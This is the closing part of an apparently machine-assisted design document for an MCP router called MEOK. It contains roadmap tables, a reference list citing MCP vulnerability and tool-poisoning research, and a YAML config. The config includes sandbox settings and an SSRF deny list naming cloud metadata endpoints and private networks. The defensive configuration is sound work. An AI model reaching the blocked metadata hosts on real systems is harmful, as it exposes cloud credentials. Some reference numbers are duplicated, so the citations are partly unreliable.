| LLM Judge | Tool description validation with small LLM |
| Tool Pinning | Cryptographic pinning to prevent rug pulls |
| SSRF Prevention | Egress filtering + URL validation |
| NATS JetStream | Distributed audit log streaming |

### Phase 3: BFT Registry (Months 7-9)

**Goal**: Sovereign, decentralized registry

| Deliverable | Description |
|-------------|-------------|
| BFT Consensus | 7-validator network with PBFT |
| Sigstore Integration | Keyless signing for server attestation |
| Content Addressing | CID-based package references |
| Federation Protocol | Cross-registry server discovery |
| Reputation System | Validator scoring + slashing |

### Phase 4: Enterprise Features (Months 10-12)

**Goal**: Production deployment readiness

| Deliverable | Description |
|-------------|-------------|
| Multi-Region | Global validator distribution |
| EU AI Act Compliance | Automated compliance reporting |
| Advanced Analytics | Usage patterns, anomaly detection |
| CI/CD Integration | GitHub Actions for build + sign + attest |
| Operator Console | Web UI for registry governance |

---

## 17. References

### Protocol Specifications

[^301^] Model Context Protocol Specification 2025-06-18 (JSON-RPC Messages). modelcontextprotocol.io/specification/2025-06-18/basic

[^304^] Model Context Protocol Specification (Latest). modelcontextprotocol.io/specification/2025-06-18

[^308^] MCP Specification Version History. modelcontextprotocol.info/specification/

[^310^] MCP 2025-06-18 Spec Update. forgecode.dev/blog/mcp-spec-updates/

[^253^] OAuth 2.1 for Remote MCP Servers. mcp.directory/blog/oauth-21-for-remote-mcp-servers-streamable-http-explained-2026

### SDK Internals

[^214^] The MCP TypeScript SDK: A Complete Guide. blog.agentailor.com/posts/mcp-typescript-sdk-complete-guide

[^218^] MCP Python SDK Authentication. github.com/modelcontextprotocol/python-sdk

[^336^] MCP Python SDK. github.com/modelcontextprotocol/python-sdk

[^332^] Discovering MCP Servers in Python. codesignal.com/learn/courses/developing-and-integrating-a-mcp-server-in-python

[^338^] Build a Python MCP Client. realpython.com/python-mcp-client/

[^340^] How to Build an MCP Server in Python. digitalocean.com/community/tutorials/mcp-server-python

### Vulnerability Research

[^251^] The Architectural Flaw at the Core of Anthropic's MCP. ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/

[^252^] MCP STDIO RCE, The Agent Execution Boundary Failed. penligent.ai/hackinglabs/mcp-stdio-rce-the-agent-execution-boundary-failed/

[^255^] Anthropic MCP Design Vulnerability Enables RCE. thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html

[^260^] "The Mother of All AI Supply Chains" — Or Just the Same Old CLI Problem. ferentin.com/blog/mother-of-all-ai-supply-chains-same-old-cli-problem/

[^296^] The Architectural Flaw at the Core of Anthropic's MCP (OX Security). ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/

[^297^] The Architectural Trap: Anthropic's MCP Just Became a Supply Chain Weapon. lyrie.ai/research/research/2026-05-07-mcp-supply-chain-systemic

[^305^] MCP by Design: RCE Across the AI Agent Ecosystem. labs.cloudsecurityalliance.org/research/csa-research-note-mcp-by-design-rce-ox-security-20260420-csa/

[^250^] 1-Click RCE in Flowise (CVE-2026-40933). obsidiansecurity.com/blog/when-is-stdio-mcp-actually-a-vulnerability

[^258^] Authenticated RCE Via MCP Adapters (Flowise). github.com/FlowiseAI/Flowise/security/advisories/GHSA-c9gw-hvqq-f33r

[^257^] Security Update: CVE-2026-30623 (LiteLLM). docs.litellm.ai/blog/mcp-stdio-command-injection-april-2026

[^256^] CVE-2026-30617 (LangChain-ChatChat). cvefeed.io/vuln/detail/CVE-2026-30617

[^238^] SSRF in MCP Client Security Spring Boot. security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGAICOMMUNITY-17279270

### Tool Poisoning Research

[^62^] MCPTox: A Benchmark for Tool Poisoning Attack on Real-World MCP Servers (AAAI-26). ojs.aaai.org/index.php/AAAI/article/view/40895/44856

[^221^] MCPTox: A Benchmark for Tool Poisoning Attack on Real-World MCP Servers. arxiv.org/html/2508.14925v1

[^211^] MCP Tool Poisoning Defense Guide. hidekazu-konishi.com/entry/mcp_tool_poisoning_defense_guide.html

[^212^] MCP Tool Poisoning: Enterprise Defense Playbook 2026. beyondscale.tech/blog/mcp-tool-poisoning-enterprise-defense

[^213^] Beyond Tool Poisoning: Attack Surfaces of Malicious Remote MCP Servers (MDPI Electronics). mdpi.com/2079-9292/15/10/2214

[^220^] Understanding Tool Poisoning Attacks in MCP. medium.com/@bluxmit/understanding-tool-poisoning-attacks-in-model-context-protocol-mcp-b165523ab8d8

[^274^] Model Context Protocol Threat Modeling and Analyzing Vulnerabilities to Prompt Injection with Tool Poisoning. arxiv.org/html/2603.22489v1

[^263^] MCP Tool Poisoning - How It Works & How To Fight It. mcpmanager.ai/blog/tool-poisoning/

[^264^] MCP Tool Poisoning (CVE-2025-54136): A Structural Vulnerability in Agent Context. truefoundry.com/blog/blog-mcp-tool-poisoning-gateway-defense

[^269^] Understanding MCP Tool Poisoning Attacks. descope.com/learn/post/mcp-tool-poisoning

[^267^] SANDWORM_MODE: Dissecting a Multi-Stage npm Supply Chain Attack. endorlabs.com/learn/sandworm-mode-dissecting-a-multi-stage-npm-supply-chain-attack

### Sandboxed Execution

[^217^] Agent Sandboxes: A Practical Guide to Running AI-Generated Code Safely. vietanh.dev/blog/2026-02-02-agent-sandboxes

[^271^] How to sandbox AI agents in 2026: MicroVMs, gVisor & isolation strategies. northflank.com/blog/how-to-sandbox-ai-agents

[^273^] How to Sandbox LLMs & AI Shell Tools. codeant.ai/blogs/agentic-rag-shell-sandboxing

[^270^] Sandbox Management for AI Coding Agents. blaxel.ai/blog/sandbox-management-for-ai-coding-agents

[^275^] AI Code Sandboxes: A Comparative Security Study Part 1 of 2. arxiv.org/html/2606.08433v1

[^337^] No better sandbox: Wasm and the future of AI agent runtimes (Wasm I/O 2026). youtube.com/watch?v=CgpjrrPdjFQ

[^331^] Case study of WebAssembly Runtimes for AI Applications. eurecom.fr/publication/7631/download/comsys-publi-7631.pdf

### SSRF Prevention

[^242^] API7 Server Side Requests Forgery, Protect Against Threats. stackhawk.com/blog/understanding-and-protecting-against-api7-server-side-request-forgery/

[^247^] Server Side Request Forgery (SSRF): Attacks & Prevention. vectra.ai/topics/server-side-request-forgery

### Rate Limiting & Multi-Tenancy

[^239^] Multi-Tenant MCP Servers: Auth, Tenancy, and Rate Limiting Done Right. padiso.co/blog/multi-tenant-mcp-servers-auth-tenancy-rate-limiting/

[^245^] MCP Server Rate-Limiting Patterns for AI Tools. safeguard.sh/resources/blog/mcp-server-rate-limiting-patterns

[^246^] How to Implement MCP Server Rate Limiting. fast.io/resources/mcp-server-rate-limiting/

[^248^] MCP Rate Limiting: Why Your AI Agent Needs Traffic Controls. mintmcp.com/blog/rate-limiting-with-mcp

[^250^] 9 AI Agents, One API Quota — The Rate Limiting Problem Nobody Talks About. tamirdresher.com/blog/2026/03/21/rate-limiting-multi-agent

[^265^] Multi-Tenant MCP Servers: Auth, Tenancy, and Rate Limiting Done Right. padiso.co/blog/multi-tenant-mcp-servers-auth-tenancy-rate-limiting/

[^266^] MCP Security for Multi-Tenant AI Agents: Explained. prefactor.tech/blog/mcp-security-multi-tenant-ai-agents-explained

[^268^] Multi-Tenant AI Agent Architecture: Design Guide (2026). fast.io/resources/ai-agent-multi-tenant-architecture/

### Audit Trails

[^240^] How to Build Audit Trails for AI Coding Agents. mintmcp.com/blog/build-audit-trails-ai-coding-agents

[^241^] MCP security: Logging and runtime security measures. redhat.com/en/blog/mcp-security-logging-and-runtime-security-measures

[^243^] agent-audit-trail-mcp: Immutable audit logging for AI agents. github.com/AiAgentKarl/agent-audit-trail-mcp

[^244^] Real-Time Agent Logging with MCP. prefactor.tech/blog/real-time-agent-logging-with-mcp

[^249^] Audit Trails for Agent Auth in B2B SaaS – Compliance Guide. scalekit.com/blog/audit-trail-agent-auth

[^251^] Implementing Audit Logging and Retention in MCP. bytebridge.medium.com/implementing-audit-logging-and-retention-in-mcp-cc4d28ee7c50

### Gateway Implementations

[^216^] Microsoft MCP Gateway. github.com/microsoft/mcp-gateway

[^219^] MCP gateway architecture: A complete technical guide. tyk.io/learning-center/mcp-gateway-architecture-technical-guide/

[^222^] MCP Gateway: How It Works, Capabilities and Use Cases. obot.ai/resources/learning-center/mcp-gateway/

[^395^] Tyk MCP Gateway. tyk.io/tyk-mcp-gateway/

[^386^] Best MCP Gateways of 2025: Top AI Gateway Platforms Compared. lunar.dev/post/best-mcp-gateways-of-2025-why-lunar-dev-leads-the-pack

[^388^] AI Gateway Comparison 2026: Zuplo vs Kong vs Gravitee vs Tyk vs Apigee. zuplo.com/learning-center/ai-gateway-comparison-mcp-a2a-agent-governance

[^400^] Exploring MCP Gateways (2025). requesty.ai/blog/top-mcp-gateways

### Server Discovery

[^300^] MCP Cheat Sheet: Complete Guide to the Model Context Protocol. webfuse.com/mcp-cheat-sheet

[^303^] MCP Tool Discovery: How It Works & 5 Tools to Know in 2026. obot.ai/resources/learning-center/mcp-tool-discovery/

[^307^] MCP Server Discovery: Complete 2026 Guide to Implementing .well-known/mcp.json. ekamoira.com/blog/mcp-server-discovery-implement-well-known-mcp-json-2026-guide

### Supply Chain Security

[^384^] How to Implement Supply Chain Security with Sigstore. oneuptime.com/blog/post/2026-01-25-sigstore-supply-chain-security/view

[^387^] What Is Sigstore? Keyless Signing for the Software Supply Chain. sbomify.com/2024/08/12/what-is-sigstore/

[^339^] Package Management with Hinge (Sovereign Registry). docs.janus-lang.org/tutorials/package-management/

### BFT Consensus

[^259^] Byzantine Fault Tolerant Consensus. chain.link/article/byzantine-fault-tolerant-consensus

[^261^] A Lightweight Byzantine Fault-tolerant Consensus. researchsquare.com/article/rs-9535248/v1.pdf

[^262^] Byzantine Fault Tolerance - An Overview. sciencedirect.com/topics/computer-science/byzantine-fault-tolerance

### Transport Comparison

[^254^] gRPC vs REST 2026: 77% Faster, 10x Smaller Payloads. tech-insider.org/grpc-vs-rest-2026/

### Security Checklists & State of Ecosystem

[^389^] Securing MCP: a defense-first architecture guide. christian-schneider.net/blog/securing-mcp-defense-first-architecture/

[^399^] The State of MCP Security: March 2026. nimblebrain.ai/blog/state-of-mcp-security-2026/

[^329^] MCP Vulnerability Scanner: Pre-deploy vs Runtime. pipelab.org/learn/mcp-vulnerability-scanner/

[^330^] MCP Security Tools. mcpverified.com/security/tools

[^333^] Introducing MCP-Scan: Protecting MCP with Invariant. invariantlabs.ai/blog/introducing-mcp-scan

### Governance & Compliance

[^299^] EU AI Act Compliance for Autonomous AI Agents in 2026. covasant.com/blogs/eu-ai-act-compliance-autonomous-agents-enterprise-2026

[^302^] AI agent governance: the enterprise guide. swiftask.ai/blog/ai-agent-governance-enterprise

[^306^] AI Agent Governance: Best Practices for Enterprise. mindstudio.ai/blog/ai-agent-governance

[^309^] Agentic AI Governance Framework for Secure Enterprise AI. witness.ai/blog/agentic-ai-governance-framework/

### Infrastructure

[^392^] Consul, etcd, ZooKeeper, and Nacos Comparison. medium.com/@karim.albakry/in-depth-comparison-of-distributed-coordination-tools-consul-etcd-zookeeper-and-nacos-a6f8e5d612a6

[^391^] NATS & JetStream in Go: Cloud-Native Messaging at Scale. alamrafiul.com/posts/nats-jetstream/

[^396^] JetStream wire API Reference. docs.nats.io/reference/reference-protocols/nats_api_reference

---

## Appendix A: Complete MEOK Router Configuration Schema

```yaml
# meok-router-full-config.yaml
apiVersion: meok.io/v1
kind: MCPRouter
metadata:
  name: meok-production-router
  version: "1.0.0"

spec:
  # Protocol configuration
  protocol:
    version: "2025-11-25"
    transports:
      primary: "streamable-http"
      secondary: "grpc"
    
  # Security
  security:
    authentication:
      type: "oauth2.1"
      pkce: { required: true }
      resource_indicators: { enabled: true }
      token_validation:
        audience: { required: true }
        issuer_whitelist: ["https://auth.meok.io"]
        clock_skew_seconds: 60
    
    authorization:
      rbac:
        enabled: true
        policy_engine: "cedar"
      scope_enforcement: { enabled: true }
    
    sandbox:
      runtimes:
        - name: "firecracker"
          isolation: "hardware"
          boot_ms: 125
          max_exec_seconds: 30
          max_memory_mb: 512
          network: "deny-all-except-whitelist"
          whitelist:
            - "api.github.com:443"
            - "api.openai.com:443"
          
        - name: "gvisor"
          isolation: "syscall"
          boot_ms: 300
          max_exec_seconds: 60
          max_memory_mb: 1024
          network: "monitor"
          
        - name: "container"
          isolation: "process"
          boot_ms: 100
          max_exec_seconds: 300
          seccomp_profile: "mcp-restricted"
          apparmor_profile: "mcp-default"
          capabilities:
            drop: ["ALL"]
            add: ["NET_BIND_SERVICE"]
          read_only_rootfs: true
          no_new_privileges: true
    
    tool_validation:
      stages:
        - name: "json_schema"
          enabled: true
        - name: "pattern_matching"
          enabled: true
          patterns_db: "mcp-security-patterns-v2026.1"
        - name: "llm_judge"
          enabled: true
          model: "claude-3.5-haiku"
          max_latency_ms: 2000
        - name: "hash_pinning"
          enabled: true
      
    ssrf_prevention:
      enabled: true
      url_validation:
        blocked_schemes: ["file", "gopher", "dict", "ftp", "ldap"]
        blocked_hosts:
          - "localhost"
          - "127.0.0.1"
          - "::1"
          - "169.254.169.254"
          - "metadata.google.internal"
          - "metadata.aws.internal"
        blocked_networks:
          - "10.0.0.0/8"
          - "172.16.0.0/12"
          - "192.168.0.0/16"
          - "127.0.0.0/8"
          - "169.254.0.0/16"
          - "fc00::/7"
      resolve_before_request: true
      max_response_size_bytes: 10485760
      response_timeout_seconds: 30
    
  # Multi-tenancy
  tenancy:
    mode: "namespace"  # namespace | vpc | silo
    isolation:
      database: { row_level_security: true }
      network: { policies: true }
      storage: { per_tenant: true }
    
  # Rate limiting
  rate_limiting:
    algorithm: "token_bucket"
    storage: "redis_cluster"
    levels:
      - name: "global"
        capacity: 100000
        refill_per_second: 10000
      - name: "tenant"
        capacity: 1000
        refill_per_second: 100
      - name: "user"
        capacity: 100
        refill_per_second: 10
      - name: "tool"
        default_cost: 1
        overrides:
          query_database: 5
          execute_code: 50
          delete_data: 1000
    
  # Audit logging
  audit:
    backend: "nats_jetstream"
    stream:
      name: "MCP_AUDIT"
      subjects: ["audit.>"]
      retention: "limits"
      max_age_days: 90
      max_bytes: 100000000000  # 100GB
      replicas: 3
    schema:
      version: "v1.0"
      required_fields:
        - timestamp
        - trace_id
        - event_type
        - actor
        - action
        - outcome
    integrity:
      hash_chain: { enabled: true, algorithm: "sha256" }
      merkle_tree: { enabled: true }
    compliance:
      eu_ai_act: { enabled: true }
      soc2: { enabled: true }
      gdpr: { enabled: true }
    
  # Registry
  registry:
    type: "federated_bft"
    validators:
      count: 7
      minimum_geographic_regions: 3
      stake_requirement: "100000 MEOK"
    consensus:
      algorithm: "pbft"
      block_time_seconds: 5
      fault_tolerance: 2  # f = (n-1)/3
      threshold: 5  # 2f + 1
    attestation:
      required: true
      sigstore: { enabled: true }
      sbom: 
        enabled: true
        format: "spdx-json"
      reproducible_builds: { enabled: true }
    reputation:
      initial_score: 0.5
      minimum_for_listing: 0.3
      decay_factor: 0.99  # Per-day decay
    
  # Observability
  observability:
    metrics:
      backend: "prometheus"
      scrape_interval_seconds: 15
    tracing:
      backend: "opentelemetry"
      sampling_rate: 0.1
    alerting:
      channels:
        - type: "pagerduty"
          for: ["critical"]
        - type: "slack"
          for: ["warning", "critical"]
```

---

*Document generated on 2026-07-14. All citations reference sources current as of their publication date.*
*This research was conducted as part of the MEOK (Model Execution and Orchestration Kernel) architecture design process.*
